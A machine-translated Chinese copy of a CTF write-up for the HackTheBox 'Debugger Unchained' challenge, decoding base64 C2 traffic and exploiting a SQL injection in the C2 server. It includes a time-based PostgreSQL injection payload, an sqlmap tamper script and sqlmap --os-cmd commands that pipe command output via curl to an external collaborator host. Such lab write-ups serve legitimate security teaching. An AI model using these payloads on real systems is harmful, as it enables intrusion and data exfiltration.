<html>
<head>
<title>HTB — Dirty Money — Debugger Unchained Write Up</title>
<link href="../Styles/Style.css" type="text/css" rel="stylesheet"/>
</head>
<body>
<h1 class="translated">HTB —肮脏的钱—调试器被释放写上去</h1>
<blockquote>原文：<a href="https://infosecwriteups.com/htb-dirty-money-debugger-unchained-write-up-e831a83941e6?source=collection_archive---------1-----------------------#2022-08-04">https://infosecwriteups.com/htb-dirty-money-debugger-unchained-write-up-e831a83941e6?source=collection_archive---------1-----------------------#2022-08-04</a></blockquote><div><div class="fc ie if ig ih ii"/><div class="ij ik il im in"><div class=""/><h1 id="e87a" class="jn jo iq bd jp jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk bi translated">调试器已解锁</h1><p id="ac83" class="pw-post-body-paragraph kl km iq kn b ko kp kq kr ks kt ku kv kw kx ky kz la lb lc ld le lf lg lh li ij bi translated">这是CTF黑客盒子公司“脏钱”中的一个网络应用。它被评为容易，在英国夏天意想不到的炎热中，我设法把它变成了一个坚硬的盒子…一切都将得到解释。</p><p id="9295" class="pw-post-body-paragraph kl km iq kn b ko lj kq kr ks lk ku kv kw ll ky kz la lm lc ld le ln lg lh li ij bi translated">这篇文章没有什么特别新的东西，我也读过一些比我的过程更优雅的东西，但是可能有一些新的或者至少不同的技术可以被其他人使用。</p><h1 id="6ab8" class="jn jo iq bd jp jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk bi translated">挑战描述</h1><blockquote class="lo lp lq"><p id="e8db" class="kl km lr kn b ko lj kq kr ks lk ku kv ls ll ky kz lt lm lc ld lu ln lg lh li ij bi translated">我们的SOC团队在其中一个工作站中发现了一种新的恶意软件。他们从受感染机器的内存中提取了看起来像C2的配置文件，并导出了C2流量的网络捕获以供进一步分析。为了找出罪魁祸首，我们需要你研究C2的基础设施，并检查潜在的弱点，可以让我们进入服务器。</p></blockquote><h2 id="0cd3" class="lv jo iq bd jp lw lx dn jt ly lz dp jx kw ma mb kb la mc md kf le me mf kj mg bi translated">挑战文件</h2><p id="d00d" class="pw-post-body-paragraph kl km iq kn b ko kp kq kr ks kt ku kv kw kx ky kz la lb lc ld le lf lg lh li ij bi translated">我们还得到了另外两个文件；</p><ul class=""><li id="2d7a" class="mh mi iq kn b ko lj ks lk kw mj la mk le ml li mm mn mo mp bi translated">c2 .个人资料</li><li id="c024" class="mh mi iq kn b ko mq ks mr kw ms la mt le mu li mm mn mo mp bi translated">traffic.pcapng</li></ul><p id="31c6" class="pw-post-body-paragraph kl km iq kn b ko lj kq kr ks lk ku kv kw ll ky kz la lm lc ld le ln lg lh li ij bi translated">下面显示了“c2.profile”文件的内容。</p><pre class="mv mw mx my gt mz na nb nc aw nd bi"><span id="dd37" class="lv jo iq na b gy ne nf l ng nh">{<br/>    'sleeptime': 3000,<br/>    'jitter': 5,<br/>    'user_agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; Xbox; Xbox One) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36 Edge/44.18363.1337',<br/>    'headers': {<br/>        'Accept': '*/*',<br/>        'Accept-Language': 'en-US,en;q=0.5',<br/>        'Accept-Encoding': 'gzip, deflate',<br/>        'Sec-Fetch-Dest': 'empty',<br/>        'Sec-Fetch-Mode': 'cors',<br/>        'Sec-Fetch-Site': 'cross-site',<br/>        'Cookie': '__cflb=$$UUID$$; __cfuid=$$RECV$$'<br/>    },<br/>    'get_uri': '/assets/jquery-3.6.0.slim.min.js',<br/>    'set_uri': '/assets/jquery-3.6.0.slim.min.js'<br/>}</span></pre><p id="cf9d" class="pw-post-body-paragraph kl km iq kn b ko lj kq kr ks lk ku kv kw ll ky kz la lm lc ld le ln lg lh li ij bi translated">以下截图是来自“traffic.pcapng”文件的示例。</p><figure class="mv mw mx my gt nj gh gi paragraph-image"><div role="button" tabindex="0" class="nk nl di nm bf nn"><div class="gh gi ni"><img src="../Images/6b6b9479ee02f12a217a980d1af23f5c.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*fXKst2ZhNiUjzZHfBcAEBQ.png"/></div></div><figcaption class="nq nr gj gh gi ns nt bd b be z dk translated">Wireshark TCP流</figcaption></figure><figure class="mv mw mx my gt nj gh gi paragraph-image"><div role="button" tabindex="0" class="nk nl di nm bf nn"><div class="gh gi nu"><img src="../Images/07d5d96072c8e70640d4000f399ebce1.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*LXNkl1bySRxII9LkdZA-Rw.png"/></div></div><figcaption class="nq nr gj gh gi ns nt bd b be z dk translated">Wireshark TCP流</figcaption></figure><h2 id="1007" class="lv jo iq bd jp lw lx dn jt ly lz dp jx kw ma mb kb la mc md kf le me mf kj mg bi translated">挑战</h2><p id="1872" class="pw-post-body-paragraph kl km iq kn b ko kp kq kr ks kt ku kv kw kx ky kz la lb lc ld le lf lg lh li ij bi translated">从c2.profile中，我们可以看到几个有趣的点。</p><ol class=""><li id="9f44" class="mh mi iq kn b ko lj ks lk kw mj la mk le ml li nv mn mo mp bi translated">饼干<code class="fe nw nx ny na b">__cflb=$$UUID$$;</code>和<code class="fe nw nx ny na b">__cfuid=$$RECV$$</code></li><li id="aba6" class="mh mi iq kn b ko mq ks mr kw ms la mt le mu li nv mn mo mp bi translated"><code class="fe nw nx ny na b">get_uri</code>和<code class="fe nw nx ny na b">set_uri</code></li></ol><p id="2f5e" class="pw-post-body-paragraph kl km iq kn b ko lj kq kr ks lk ku kv kw ll ky kz la lm lc ld le ln lg lh li ij bi translated">考虑到这一点，重点转移到了流量捕捉上。回顾TCP流，我们也可以开始看到一些有趣的地方。</p><p id="b325" class="pw-post-body-paragraph kl km iq kn b ko lj kq kr ks lk ku kv kw ll ky kz la lm lc ld le ln lg lh li ij bi translated">对“/assets/jquery-3 . 6 . 0 . slim . min . js”的GET请求</p><pre class="mv mw mx my gt mz na nb nc aw nd bi"><span id="9396" class="lv jo iq na b gy ne nf l ng nh">GET /assets/jquery-3.6.0.slim.min.js HTTP/1.1<br/>Host: cdnjs.cloudflair.co<br/>User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; Xbox; Xbox One) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36 Edge/44.18363.1337<br/>Accept-Encoding: gzip, deflate<br/>Accept: */*<br/>Connection: keep-alive<br/>Accept-Language: en-US,en;q=0.5<br/>Sec-Fetch-Dest: empty<br/>Sec-Fetch-Mode: cors<br/>Sec-Fetch-Site: cross-site<br/>Cookie: __cflb=49f062b5-8b94-4fff-bb41-d504b148aa1b;</span></pre><p id="efae" class="pw-post-body-paragraph kl km iq kn b ko lj kq kr ks lk ku kv kw ll ky kz la lm lc ld le ln lg lh li ij bi translated">阅读对这个请求的响应，我们看到在jquery文件内容的末尾包含了一个“task”变量，它包含了一些突出的base64。</p><pre class="mv mw mx my gt mz na nb nc aw nd bi"><span id="04c8" class="lv jo iq na b gy ne nf l ng nh">task="eyJpZCI6IDE4LCAiY21kIjogImQyaHZZVzFwSUM5aGJHdz0ifQ==";</span></pre><p id="04c4" class="pw-post-body-paragraph kl km iq kn b ko lj kq kr ks lk ku kv kw ll ky kz la lm lc ld le ln lg lh li ij bi translated">解码以上揭示以下，更多base64。</p><pre class="mv mw mx my gt mz na nb nc aw nd bi"><span id="9766" class="lv jo iq na b gy ne nf l ng nh">{"id": 18, "cmd": "d2hvYW1pIC9hbGw="}</span></pre><p id="931c" class="pw-post-body-paragraph kl km iq kn b ko lj kq kr ks lk ku kv kw ll ky kz la lm lc ld le ln lg lh li ij bi translated">一旦解码，我们就能看到实际的命令是什么。</p><p id="18dc" class="pw-post-body-paragraph kl km iq kn b ko lj kq kr ks lk ku kv kw ll ky kz la lm lc ld le ln lg lh li ij bi translated"><code class="fe nw nx ny na b">whoami /all</code></p><p id="8bf5" class="pw-post-body-paragraph kl km iq kn b ko lj kq kr ks lk ku kv kw ll ky kz la lm lc ld le ln lg lh li ij bi translated">按照Wireshark中的流，我们看到发出了一个POST请求，这次使用了以下cookie。注意更接近base64的__cfuid值。</p><pre class="mv mw mx my gt mz na nb nc aw nd bi"><span id="5998" class="lv jo iq na b gy ne nf l ng nh">Cookie: __cflb=49f062b5-8b94-4fff-bb41-d504b148aa1b; __cfuid=eyJpZCI6IDE4LCAib3V0cHV0IjogIkNsVlRSVklnU1U1R1QxSk5RVlJKVDA0S0xTMHRMUzB0TFMwdExTMHRMUzB0TFFvS1ZYTmxjaUJPWVcxbElDQWdJQ0FnSUNBZ0lDQWdJQ0FnSUNBZ0lDQWdVMGxFSUNBZ0lDQWdJQ0FnSUNBZ0lDQWdJQ0FnSUNBZ0lDQWdJQ0FnSUNBZ0lDQWdJQ0FnSUNBZ0lDQWdJQW85UFQwOVBUMDlQVDA5UFQwOVBUMDlQVDA5UFQwOVBUMDlQVDA5UFNBOVBUMDlQVDA5UFQwOVBUMDlQVDA5UFQwOVBUMDlQVDA5UFQwOVBUMDlQVDA5UFQwOVBUMDlQVDA5UFQwOUNtUmxjMnQwYjNBdGNYWXpibkZzYlZ4c1lYSnllU0J6ZEdWMlpXNXpJRk10TVMwMUxUSXhMVEl3TWpreU56Z3lNRGd0TVRnNU9USTJNalV3TmkweU5UTXpPVGc1TlRBM0xURXdNREFLQ2dwSFVrOVZVQ0JKVGtaUFVrMUJWRWxQVGdvdExTMHRMUzB0TFMwdExTMHRMUzB0TFFvS1IzSnZkWEFnVG1GdFpTQWdJQ0FnSUNBZ0lDQWdJQ0FnSUNBZ0lDQWdJQ0FnSUNBZ0lDQWdJQ0FnSUNBZ0lDQWdJQ0FnSUNBZ0lDQWdJQ0FnSUNCVWVYQmxJQ0FnSUNBZ0lDQWdJQ0FnSUZOSlJDQWdJQ0FnSUNBZ0lDQkJkSFJ5YVdKMWRHVnpJQ0FnSUNBZ0lDQWdJQ0FnSUNBZ0lDQWdJQ0FnSUNBZ0lDQWdJQ0FnSUNBZ0lDQWdJQ0FnSUFvOVBUMDlQVDA5UFQwOVBUMDlQVDA5UFQwOVBUMDlQVDA5UFQwOVBUMDlQVDA5UFQwOVBUMDlQVDA5UFQwOVBUMDlQVDA5UFQwOVBUMDlQVDA5SUQwOVBUMDlQVDA5UFQwOVBUMDlQVDBnUFQwOVBUMDlQVDA5UFQwOUlEMDlQVDA5UFQwOVBUMDlQVDA5UFQwOVBUMDlQVDA5UFQwOVBUMDlQVDA5UFQwOVBUMDlQVDA5UFQwOVBUMDlQVDA5Q2tWMlpYSjViMjVsSUNBZ0lDQWdJQ0FnSUNBZ0lDQWdJQ0FnSUNBZ0lDQWdJQ0FnSUNBZ0lDQWdJQ0FnSUNBZ0lDQWdJQ0FnSUNBZ0lDQWdJQ0FnVjJWc2JDMXJibTkzYmlCbmNtOTFjQ0JUTFRFdE1TMHdJQ0FnSUNBZ1RXRnVaR0YwYjNKNUlHZHliM1Z3TENCRmJtRmliR1ZrSUdKNUlHUmxabUYxYkhRc0lFVnVZV0pzWldRZ1ozSnZkWEFLVGxRZ1FWVlVTRTlTU1ZSWlhFeHZZMkZzSUdGalkyOTFiblFnWVc1a0lHMWxiV0psY2lCdlppQkJaRzFwYm1semRISmhkRzl5Y3lCbmNtOTFjQ0JYWld4c0xXdHViM2R1SUdkeWIzVndJRk10TVMwMUxURXhOQ0FnSUNCSGNtOTFjQ0IxYzJWa0lHWnZjaUJrWlc1NUlHOXViSGtnSUNBZ0lDQWdJQ0FnSUNBZ0lDQWdJQ0FnSUNBZ0lDQWdJQXBDVlVsTVZFbE9YRUZrYldsdWFYTjBjbUYwYjNKeklDQWdJQ0FnSUNBZ0lDQWdJQ0FnSUNBZ0lDQWdJQ0FnSUNBZ0lDQWdJQ0FnSUNBZ0lDQWdJRUZzYVdGeklDQWdJQ0FnSUNBZ0lDQWdVeTB4TFRVdE16SXROVFEwSUVkeWIzVndJSFZ6WldRZ1ptOXlJR1JsYm5rZ2IyNXNlU0FnSUNBZ0lDQWdJQ0FnSUNBZ0lDQWdJQ0FnSUNBZ0lDQWdDa0pWU1V4VVNVNWNWWE5sY25NZ0lDQWdJQ0FnSUNBZ0lDQWdJQ0FnSUNBZ0lDQWdJQ0FnSUNBZ0lDQWdJQ0FnSUNBZ0lDQWdJQ0FnSUNBZ0lDQWdRV3hwWVhNZ0lDQWdJQ0FnSUNBZ0lDQlRMVEV0TlMwek1pMDFORFVnVFdGdVpHRjBiM0o1SUdkeWIzVndMQ0JGYm1GaWJHVmtJR0o1SUdSbFptRjFiSFFzSUVWdVlXSnNaV1FnWjNKdmRYQUtUbFFnUVZWVVNFOVNTVlJaWEVsT1ZFVlNRVU5VU1ZaRklDQWdJQ0FnSUNBZ0lDQWdJQ0FnSUNBZ0lDQWdJQ0FnSUNBZ0lDQWdJQ0FnSUNBZ0lDQlhaV3hzTFd0dWIzZHVJR2R5YjNWd0lGTXRNUzAxTFRRZ0lDQWdJQ0JOWVc1a1lYUnZjbmtnWjNKdmRYQXNJRVZ1WVdKc1pXUWdZbmtnWkdWbVlYVnNkQ3dnUlc1aFlteGxaQ0JuY205MWNBcERUMDVUVDB4RklFeFBSMDlPSUNBZ0lDQWdJQ0FnSUNBZ0lDQWdJQ0FnSUNBZ0lDQWdJQ0FnSUNBZ0lDQWdJQ0FnSUNBZ0lDQWdJQ0FnSUNBZ0lGZGxiR3d0YTI1dmQyNGdaM0p2ZFhBZ1V5MHhMVEl0TVNBZ0lDQWdJRTFoYm1SaGRHOXllU0JuY205MWNDd2dSVzVoWW14bFpDQmllU0JrWldaaGRXeDBMQ0JGYm1GaWJHVmtJR2R5YjNWd0NrNVVJRUZWVkVoUFVrbFVXVnhCZFhSb1pXNTBhV05oZEdWa0lGVnpaWEp6SUNBZ0lDQWdJQ0FnSUNBZ0lDQWdJQ0FnSUNBZ0lDQWdJQ0FnSUNBZ1YyVnNiQzFyYm05M2JpQm5jbTkxY0NCVExURXROUzB4TVNBZ0lDQWdUV0Z1WkdGMGIzSjVJR2R5YjNWd0xDQkZibUZpYkdWa0lHSjVJR1JsWm1GMWJIUXNJRVZ1WVdKc1pXUWdaM0p2ZFhBS1RsUWdRVlZVU0U5U1NWUlpYRlJvYVhNZ1QzSm5ZVzVwZW1GMGFXOXVJQ0FnSUNBZ0lDQWdJQ0FnSUNBZ0lDQWdJQ0FnSUNBZ0lDQWdJQ0FnSUNCWFpXeHNMV3R1YjNkdUlHZHliM1Z3SUZNdE1TMDFMVEUxSUNBZ0lDQk5ZVzVrWVhSdmNua2daM0p2ZFhBc0lFVnVZV0pzWldRZ1lua2daR1ZtWVhWc2RDd2dSVzVoWW14bFpDQm5jbTkxY0FwT1ZDQkJWVlJJVDFKSlZGbGNURzlqWVd3Z1lXTmpiM1Z1ZENBZ0lDQWdJQ0FnSUNBZ0lDQWdJQ0FnSUNBZ0lDQWdJQ0FnSUNBZ0lDQWdJQ0FnSUZkbGJHd3RhMjV2ZDI0Z1ozSnZkWEFnVXkweExUVXRNVEV6SUNBZ0lFMWhibVJoZEc5eWVTQm5jbTkxY0N3Z1JXNWhZbXhsWkNCaWVTQmtaV1poZFd4MExDQkZibUZpYkdWa0lHZHliM1Z3Q2t4UFEwRk1JQ0FnSUNBZ0lDQWdJQ0FnSUNBZ0lDQWdJQ0FnSUNBZ0lDQWdJQ0FnSUNBZ0lDQWdJQ0FnSUNBZ0lDQWdJQ0FnSUNBZ0lDQWdJQ0FnVjJWc2JDMXJibTkzYmlCbmNtOTFjQ0JUTFRFdE1pMHdJQ0FnSUNBZ1RXRnVaR0YwYjNKNUlHZHliM1Z3TENCRmJtRmliR1ZrSUdKNUlHUmxabUYxYkhRc0lFVnVZV0pzWldRZ1ozSnZkWEFLVGxRZ1FWVlVTRTlTU1ZSWlhFNVVURTBnUVhWMGFHVnVkR2xqWVhScGIyNGdJQ0FnSUNBZ0lDQWdJQ0FnSUNBZ0lDQWdJQ0FnSUNBZ0lDQWdJQ0JYWld4c0xXdHViM2R1SUdkeWIzVndJRk10TVMwMUxUWTBMVEV3SUNCTllXNWtZWFJ2Y25rZ1ozSnZkWEFzSUVWdVlXSnNaV1FnWW5rZ1pHVm1ZWFZzZEN3Z1JXNWhZbXhsWkNCbmNtOTFjQXBOWVc1a1lYUnZjbmtnVEdGaVpXeGNUV1ZrYVhWdElFMWhibVJoZEc5eWVTQk1aWFpsYkNBZ0lDQWdJQ0FnSUNBZ0lDQWdJQ0FnSUNBZ0lDQWdJRXhoWW1Wc0lDQWdJQ0FnSUNBZ0lDQWdVeTB4TFRFMkxUZ3hPVElnSUNBZ0lDQWdJQ0FnSUNBZ0lDQWdJQ0FnSUNBZ0lDQWdJQ0FnSUNBZ0lDQWdJQ0FnSUNBZ0lDQWdJQ0FnSUNBZ0lDQWdDZ29LVUZKSlZrbE1SVWRGVXlCSlRrWlBVazFCVkVsUFRnb3RMUzB0TFMwdExTMHRMUzB0TFMwdExTMHRMUzB0Q2dwUWNtbDJhV3hsWjJVZ1RtRnRaU0FnSUNBZ0lDQWdJQ0FnSUNBZ0lDQkVaWE5qY21sd2RHbHZiaUFnSUNBZ0lDQWdJQ0FnSUNBZ0lDQWdJQ0FnSUNBZ0lDQWdVM1JoZEdVZ0lDQUtQVDA5UFQwOVBUMDlQVDA5UFQwOVBUMDlQVDA5UFQwOVBUMDlQVDBnUFQwOVBUMDlQVDA5UFQwOVBUMDlQVDA5UFQwOVBUMDlQVDA5UFQwOVBUMDlQVDA5SUQwOVBUMDlQVDA5Q2xObFUyaDFkR1J2ZDI1UWNtbDJhV3hsWjJVZ0lDQWdJQ0FnSUNBZ0lGTm9kWFFnWkc5M2JpQjBhR1VnYzNsemRHVnRJQ0FnSUNBZ0lDQWdJQ0FnSUNBZ0lDQkVhWE5oWW14bFpBcFRaVU5vWVc1blpVNXZkR2xtZVZCeWFYWnBiR1ZuWlNBZ0lDQWdJQ0JDZVhCaGMzTWdkSEpoZG1WeWMyVWdZMmhsWTJ0cGJtY2dJQ0FnSUNBZ0lDQWdJQ0FnUlc1aFlteGxaQ0FLVTJWVmJtUnZZMnRRY21sMmFXeGxaMlVnSUNBZ0lDQWdJQ0FnSUNBZ1VtVnRiM1psSUdOdmJYQjFkR1Z5SUdaeWIyMGdaRzlqYTJsdVp5QnpkR0YwYVc5dUlFUnBjMkZpYkdWa0NsTmxTVzVqY21WaGMyVlhiM0pyYVc1blUyVjBVSEpwZG1sc1pXZGxJRWx1WTNKbFlYTmxJR0VnY0hKdlkyVnpjeUIzYjNKcmFXNW5JSE5sZENBZ0lDQWdJQ0JFYVhOaFlteGxaQXBUWlZScGJXVmFiMjVsVUhKcGRtbHNaV2RsSUNBZ0lDQWdJQ0FnSUNCRGFHRnVaMlVnZEdobElIUnBiV1VnZW05dVpTQWdJQ0FnSUNBZ0lDQWdJQ0FnSUNBZ1JHbHpZV0pzWldRSyJ9</span></pre><p id="2480" class="pw-post-body-paragraph kl km iq kn b ko lj kq kr ks lk ku kv kw ll ky kz la lm lc ld le ln lg lh li ij bi translated">我们再次对这些值进行解码，直到我们最终检索到之前看到的<code class="fe nw nx ny na b">whoami /all</code>命令的输出。(这是我应该更加注意的地方)</p><pre class="mv mw mx my gt mz na nb nc aw nd bi"><span id="b557" class="lv jo iq na b gy ne nf l ng nh">USER INFORMATION<br/>----------------</span><span id="7863" class="lv jo iq na b gy nz nf l ng nh">User Name                     SID                                           <br/>============================= ==============================================<br/>desktop-qv3nqlm\larry stevens S-1-5-21-2029278208-1899262506-2533989507-1000<br/>&lt;REDACTED&gt;</span></pre><p id="eb70" class="pw-post-body-paragraph kl km iq kn b ko lj kq kr ks lk ku kv kw ll ky kz la lm lc ld le ln lg lh li ij bi translated">继续捕捉，我们还会看到另一条有趣的信息。在一个POST请求中，我们看到一个500内部服务器错误，它向我们透露了一些重要信息。</p><pre class="mv mw mx my gt mz na nb nc aw nd bi"><span id="d23b" class="lv jo iq na b gy ne nf l ng nh">HTTP/1.1 500 INTERNAL SERVER ERROR<br/>Server: Werkzeug/2.1.2 Python/3.8.13<br/>Date: Fri, 24 Jun 2022 17:05:45 GMT<br/>Content-Type: text/html; charset=utf-8<br/>Content-Length: 18904<br/>Connection: close</span><span id="618e" class="lv jo iq na b gy nz nf l ng nh">&lt;!doctype html&gt;<br/>&lt;html lang=en&gt;<br/>  &lt;head&gt;<br/>    &lt;title&gt;psycopg2.errors.UniqueViolation: duplicate key value violates unique constraint "task_outputs_task_id_key"<br/>DETAIL:  Key (task_id)=(20) already exists.<br/>&lt;REDACTED&gt;<br/>  File "/app/application/models/bot.py", line 130, in saveTaskResp<br/>    db.execute(f"""INSERT INTO task_outputs(task_id, output) VALUES ('{id}', '{output}')""")</span></pre><ol class=""><li id="c48f" class="mh mi iq kn b ko lj ks lk kw mj la mk le ml li nv mn mo mp bi translated">我们看到了“psycopg2”库，这是一个“Python的PostgreSQL适配器”</li><li id="0f91" class="mh mi iq kn b ko mq ks mr kw ms la mt le mu li nv mn mo mp bi translated">我们还看到下面的INSERT INTO语句似乎容易受到SQL注入的攻击，我们还知道我们正在处理一个PostgreSQL数据库。</li></ol><h2 id="c2ff" class="lv jo iq bd jp lw lx dn jt ly lz dp jx kw ma mb kb la mc md kf le me mf kj mg bi translated">剥削</h2><p id="9527" class="pw-post-body-paragraph kl km iq kn b ko kp kq kr ks kt ku kv kw kx ky kz la lb lc ld le lf lg lh li ij bi translated">这是事情发生转折的地方。首先，我开始处理一个有效负载，以证明我们确实在查询一个PostgreSQL数据库，如果这是真的，查询将导致10秒钟的睡眠。以下是整理出来的。</p><p id="89a6" class="pw-post-body-paragraph kl km iq kn b ko lj kq kr ks lk ku kv kw ll ky kz la lm lc ld le ln lg lh li ij bi translated">我们获取version()的一个子字符串，并将它的前10个字符与“PostgreSQL”匹配，如果为真，则休眠10秒钟。</p><pre class="mv mw mx my gt mz na nb nc aw nd bi"><span id="16ce" class="lv jo iq na b gy ne nf l ng nh">{"id": "400); SELECT case when (SELECT substr(version(),1,10))=$$PostgreSQL$$ then pg_sleep(10) end;--+-","output":1}</span></pre><p id="6326" class="pw-post-body-paragraph kl km iq kn b ko lj kq kr ks lk ku kv kw ll ky kz la lm lc ld le ln lg lh li ij bi translated">但是，在将它发送到服务器之前，我们必须记住对有效载荷进行64位基础处理。产生了下面的POST请求。</p><pre class="mv mw mx my gt mz na nb nc aw nd bi"><span id="f3c5" class="lv jo iq na b gy ne nf l ng nh">POST /assets/jquery-3.6.0.slim.min.js HTTP/1.1<br/>Host: cdnjs.cloudflair.co<br/>User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; Xbox; Xbox One) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36 Edge/44.18363.1337<br/>Accept-Encoding: gzip, deflate<br/>Accept: */*<br/>Connection: keep-alive<br/>Accept-Language: en-US,en;q=0.5<br/>Sec-Fetch-Dest: empty<br/>Sec-Fetch-Mode: cors<br/>Sec-Fetch-Site: cross-site<br/>Cookie: __cflb=49f062b5-8b94-4fff-bb41-d504b1481337; __cfuid=eyJpZCI6ICI0MDApOyBTRUxFQ1QgY2FzZSB3aGVuIChTRUxFQ1Qgc3Vic3RyKHZlcnNpb24oKSwxLDEwKSk9JCRQb3N0Z3JlU1FMJCQgdGhlbiBwZ19zbGVlcCgxMCkgZW5kOy0tKy0iLCJvdXRwdXQiOjF9<br/>Content-Length: 0</span></pre><p id="b76d" class="pw-post-body-paragraph kl km iq kn b ko lj kq kr ks lk ku kv kw ll ky kz la lm lc ld le ln lg lh li ij bi translated">这确实导致执行暂停了10秒钟，在这几秒钟后我收到了响应。太好了，我们走了…我花了太多的时间尝试使用所有已知的方法获得代码执行，我不会让你厌烦我所有的时间浪费。所以我求助于SQLmap，因为我知道这不是一个简单的有效负载。首先，我们需要注入到cookie中，没问题，我们还必须对有效载荷进行base64编码，有点棘手，最后处理我们之前看到的问题，重复键违规。</p><p id="bb92" class="pw-post-body-paragraph kl km iq kn b ko lj kq kr ks lk ku kv kw ll ky kz la lm lc ld le ln lg lh li ij bi translated">因此，一个篡改脚本是有序的，经过多次尝试和错误，下面的脚本是我最后得到的。现在，请不要对我绕过重复键违反的方法进行评判，正如我所说的，天气很热，时间很晚，我很累。</p><pre class="mv mw mx my gt mz na nb nc aw nd bi"><span id="718f" class="lv jo iq na b gy ne nf l ng nh">import base64<br/>from urllib.parse import quote<br/>from numpy import random</span><span id="726e" class="lv jo iq na b gy nz nf l ng nh">def tamper(payload, **kwargs):<br/>    params = '{"id": "%s); %s--+-","output":1}' % (random.randint(1000000), payload)<br/>    data = params<br/>    data = base64.b64encode(data.encode('ascii'))<br/>    return data.decode('utf-8')</span></pre><p id="cbf9" class="pw-post-body-paragraph kl km iq kn b ko lj kq kr ks lk ku kv kw ll ky kz la lm lc ld le ln lg lh li ij bi translated">我们这里基本上有一个脚本，它将创建我们需要的JSON有效载荷(它将用一个0到1000000之间的随机整数替换id——我要求您不要评判我), base64编码并为我们返回有效载荷。然后，我们可以按以下方式使用该脚本。请注意，我已经让它在没有— os-cmd标志的情况下运行，以确保SQLmap可以识别漏洞。</p><pre class="mv mw mx my gt mz na nb nc aw nd bi"><span id="342a" class="lv jo iq na b gy ne nf l ng nh">sqlmap -r req.req --data "*" --method POST --tamper tamper.py --dbms PostgreSQL --level 5 --risk 3 --os-cmd "ls -la | curl -H 'Content-Type: application/json' -X POST --data-binary @- http://r7z5rbdnaaq2ecne5ncjyvp9p0vvjk.o<br/>astify.com" --proxy=http://127.0.0.1:8080</span></pre><p id="686b" class="pw-post-body-paragraph kl km iq kn b ko lj kq kr ks lk ku kv kw ll ky kz la lm lc ld le ln lg lh li ij bi translated">“req.req”文件只是我们之前使用的POST请求，但是自定义注入点放在cookie上。</p><pre class="mv mw mx my gt mz na nb nc aw nd bi"><span id="f8b1" class="lv jo iq na b gy ne nf l ng nh">Cookie: __cflb=49f062b5-8b94-4fff-bb41-d504b1481337; __cfuid=*</span></pre><p id="a2bc" class="pw-post-body-paragraph kl km iq kn b ko lj kq kr ks lk ku kv kw ll ky kz la lm lc ld le ln lg lh li ij bi translated">谢天谢地，我收到了“ls -la”命令的输出，它是通过curl发布到Burp collaborator服务器上的。</p><figure class="mv mw mx my gt nj gh gi paragraph-image"><div role="button" tabindex="0" class="nk nl di nm bf nn"><div class="gh gi oa"><img src="../Images/0ab398cd20988caf035a2f716a8fdbeb.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*ahxzJoJQMBFep0ibRBH1CQ.png"/></div></div><figcaption class="nq nr gj gh gi ns nt bd b be z dk translated">Burp合作者接收命令输出</figcaption></figure><p id="feca" class="pw-post-body-paragraph kl km iq kn b ko lj kq kr ks lk ku kv kw ll ky kz la lm lc ld le ln lg lh li ij bi translated">在更多的枚举之后，在根目录中发现了一个“readfile”二进制文件，所以我再次执行该二进制文件，并将输出发送给Burp collaborator。</p><pre class="mv mw mx my gt mz na nb nc aw nd bi"><span id="3a36" class="lv jo iq na b gy ne nf l ng nh">sqlmap -r req.req --data "*" --method POST --tamper tamper.py --dbms PostgreSQL --level 5 --risk 3 --os-cmd "/readflag | curl -H 'Content-Type: application/json' -X POST --data-binary @- http://r7z5rbdnaaq2ecne5ncjyvp9p0vvj<br/>k.oastify.com" --proxy=http://127.0.0.1:8080</span></pre><p id="10aa" class="pw-post-body-paragraph kl km iq kn b ko lj kq kr ks lk ku kv kw ll ky kz la lm lc ld le ln lg lh li ij bi translated">最后旗子被取回。</p><figure class="mv mw mx my gt nj gh gi paragraph-image"><div role="button" tabindex="0" class="nk nl di nm bf nn"><div class="gh gi ob"><img src="../Images/46e1c4cc3337da9eb26b277952a953ec.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*LMhOU7coed8RUAJloNdujw.png"/></div></div><figcaption class="nq nr gj gh gi ns nt bd b be z dk translated">打嗝合作者接收标志</figcaption></figure><h1 id="325f" class="jn jo iq bd jp jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk bi translated">结论</h1><p id="1fb3" class="pw-post-body-paragraph kl km iq kn b ko kp kq kr ks kt ku kv kw kx ky kz la lb lc ld le lf lg lh li ij bi translated">虽然我对这个挑战感到沮丧，我觉得我完全过度设计了这个过程，但我内心深处真的很喜欢这个挑战。希望篡改脚本将在未来再次使用，或者其他人也可以利用它。</p><p id="8ad8" class="pw-post-body-paragraph kl km iq kn b ko lj kq kr ks lk ku kv kw ll ky kz la lm lc ld le ln lg lh li ij bi translated">在<a class="ae oc" href="https://www.sentrium.co.uk/" rel="noopener ugc nofollow" target="_blank">https://www.sentrium.co.uk/</a>阅读更多</p></div><div class="ab cl od oe hu of" role="separator"><span class="og bw bk oh oi oj"/><span class="og bw bk oh oi oj"/><span class="og bw bk oh oi"/></div><div class="ij ik il im in"><p id="4d6a" class="pw-post-body-paragraph kl km iq kn b ko lj kq kr ks lk ku kv kw ll ky kz la lm lc ld le ln lg lh li ij bi translated"><em class="lr">来自Infosec的报道:Infosec上每天都有很多事情发生，很难跟上。</em> <a class="ae oc" href="https://weekly.infosecwriteups.com/" rel="noopener ugc nofollow" target="_blank"> <strong class="kn ir"> <em class="lr">加入我们的每周简讯</em> </strong> </a> <em class="lr">以5篇文章、4个线程、3个视频、2个Github Repos和工具以及1个工作提醒的形式免费获取所有最新的Infosec趋势！</em></p></div></div>    
</body>
</html>